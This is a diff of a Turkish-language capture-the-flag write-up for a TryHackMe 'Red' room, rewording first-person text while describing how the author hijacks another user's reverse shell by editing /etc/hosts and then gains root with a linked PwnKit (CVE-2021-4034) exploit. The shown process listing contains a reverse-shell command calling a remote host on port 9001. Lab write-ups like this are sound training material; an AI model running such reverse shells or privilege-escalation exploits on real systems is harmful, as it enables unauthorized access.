@@ -108,7 +108,7 @@ Başta belirtiğim gibi ara ara bağlantı sonlandırılıyor ve parola değişt
 
 ### Red
 
-"ps aux" komutunu kullandığımda arka planda red kullanıcısının redrules.thm adresinin 9001 portuna bağlandığını gördüm.
+"ps aux" komutunu kullandığımızda arka planda red kullanıcısının redrules.thm adresinin 9001 portuna bağlandığını görüyoruz.
 
 ```console
 blue@red:/var/backups$ ps aux
@@ -119,11 +119,11 @@ root        2593  0.0  0.0      0     0 ?        I    08:32   0:00 [kworker/u30:
 red         2628  0.0  0.0   6972  2696 ?        S    08:33   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 ```
 
-/etc/hosts dosyasına domain ile beraber makinemizin IP adresini girdikten bir süre sonra red kullanıcısının adına bir bağlantı alıyorum. Dosyayı temizlediği için bu işlemi bağlantı alana kadar bir kaç kez tekrar etmeniz gerekebilir.
+/etc/hosts dosyasına domain ile beraber makinemizin IP adresini girdikten bir süre sonra red kullanıcısının adına bir bağlantı alıyoruz. Dosyayı temizlediği için bu işlemi bağlantı alana kadar bir kaç kez tekrar etmeniz gerekebilir.
 
 ![](2.webp){: width="1200" height="600" }
 
-Bağlantı geldikten sonra kendi dizininden ikinci bayrağı alıyorum.
+Bağlantı geldikten sonra kendi dizininden ikinci bayrağı alıyoruz.
 
 ```console
 red@red:~$ cat flag2 
@@ -143,7 +143,7 @@ red@red:~/.git$ ./pkexec --version
 pkexec version 0.105
 ```
 
-Adını ve sürümünü internette arattıktan sonra [bu](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) sayfa ile karşılaştım. Verilen c kodlarını düzenleyip kayıt ettikten sonra derledim. Çalıştırdıktan sonra ise doğrudan root yetkisine sahip oluyor ve üçüncü bayrağı almak için /root dizine yöneliyorum.
+Adını ve sürümünü internette arattıktan sonra [bu](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) sayfa ile karşılaştım. Verilen python kodlarını düzenleyip kayıt ettikten sonra çalıştırdım ve başarıyla root haklarına sahip oldum.
 
 ```console
 red@red:~/.git$ ls
@@ -159,4 +159,3 @@ defense  flag3  snap
 # cat flag3
 THM{***}
 ```
-
